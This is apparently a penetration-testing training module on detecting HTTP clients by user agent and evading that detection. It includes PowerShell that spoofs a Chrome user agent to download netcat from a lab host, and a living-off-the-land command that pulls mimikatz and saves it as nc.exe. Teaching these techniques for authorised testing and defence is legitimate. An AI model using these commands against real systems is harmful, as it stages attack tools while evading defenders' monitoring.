# Detect or Be Detected

## Detection

There is a need for interoperability amongst different web servers and web browser types to ensure that users have the same experience no matter their browser. HTTP clients are most readily recognized by their user agent string, which the server uses to identify which `HTTP` client is connecting to it, for example, Firefox, Chrome, etc

User agents are not only used to identify web browsers, but anything acting as an `HTTP` client and connecting to a web server via `HTTP` can have a user agent string (i.e., `cURL`, a custom `Python` script, or common tools such as `sqlmap`, or `Nmap`)

Organizations can build a list of trusted User Agents that a SIEM can apply to threat hunting

This [website](http://useragentstring.com/index.php) is handy for identifying common user agent strings. A list of user agent strings is available [here](http://useragentstring.com/pages/useragentstring.php)

## Evading Detection

### Changing User Agent

If diligent administrators or defenders have blacklisted any of these User Agents, [Invoke-WebRequest](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/invoke-webrequest?view=powershell-7.1) contains a UserAgent parameter, which allows for changing the default user agent to one emulating Internet Explorer, Firefox, Chrome, Opera, or Safari. For example, if Chrome is used internally, setting this User Agent may make the request seem legitimate

```powershell
# Listing out User Agents
PS C:\htb>[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)
Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0
Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0 Safari/534.6
Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1
Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

```powershell
# Invoking Invoke-WebRequest to download nc.exe using a Chrome User Agent
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```

### LOLBAS/GTFOBins

Application whitelisting may prevent you from using PowerShell or Netcat, and command-line logging may alert defenders to your presence. In this case, an option may be to use a "LOLBIN" (living off the land binary), alternatively also known as "misplaced trust binaries". An example LOLBIN is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), installed on some systems and contains functionality to download configuration files periodically

```powershell
PS C:\htb> GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```

Such a binary might be permitted to run by application whitelisting and be excluded from alerting. Other, more commonly available binaries are also available, and it is worth checking the [LOLBAS](https://lolbas-project.github.io/) project to find a suitable "file download" binary that exists in your environment. Linux's equivalent is the [GTFOBins](https://gtfobins.github.io/) project and is definitely also worth checking out

